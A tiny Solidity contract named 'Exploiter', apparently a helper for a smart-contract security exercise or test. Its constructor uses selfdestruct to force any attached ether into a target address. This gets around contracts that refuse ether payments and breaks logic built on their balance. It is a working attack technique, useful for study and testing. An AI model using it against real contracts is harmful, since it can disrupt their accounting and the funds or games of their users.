pragma solidity ^0.6.0;

contract Exploiter {
    constructor(address payable to) public payable {
        // redirect all the `msg.value` to `to` when selfdestructing
        selfdestruct(to);
    }
}